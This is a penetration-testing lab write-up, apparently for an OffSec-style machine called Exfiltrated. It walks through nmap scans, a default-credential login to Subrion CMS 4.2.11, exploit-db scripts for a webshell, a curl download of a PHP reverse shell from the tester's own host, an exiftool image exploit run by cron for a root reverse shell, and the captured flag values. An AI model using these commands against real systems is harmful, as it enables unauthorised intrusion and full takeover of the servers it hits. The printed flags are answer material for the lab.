# Exfiltrated

## Enumeration & scanning

- Scan all ports with nmap (22, 80)
- Scan additional info on found ports
- Find Subrion 4.2 CMS
- Robots.txt reveals some endpoints to check, such as /panel for login

``` sh
sudo nmap -p- 192.168.119.163
sudo nmap -p 22,80 -A 192.168.119.163
```

## Exploitation

- Login /panel with admin:admin
- Exploit using Subrion vulnerability in 4.2.11
- Get webshell for www-data user
- Upgrade shell to reverse shell
- Find script being executed in /etc/crontab that uses exiftool
- Exiftool is likely vulnerable to payloads, create exploit image that will be processed by cron to get root reverse shell

``` sh
# exploit 1
python3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin

# download reverse shell
python3 -m http.server 80
curl http://192.168.45.184/php-reverse-shell.php > /var/www/html/subrion/uploads/shell.phar
# execute shell
curl http://exfiltrated.offsec/uploads/shell.phar
# upgrade shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# exploit 2
# prepare payload image
python3 50911.py -s 192.168.45.184 5555
# upload image
# wait for cron and capture shell
nc -nlvp 5555

# find flags
cat proof.txt
6526ede0d6633cc2e6f914b5c740cd9e
cd coaran
cat local.txt
ee6cbf51de45027761c36aaebe322e21
```

## References

- https://www.exploit-db.com/exploits/49876
- https://www.exploit-db.com/exploits/50911


## Rabbit holes

- Looked into the .sh script ran by cron too long, wasn't vulnerable by itself.
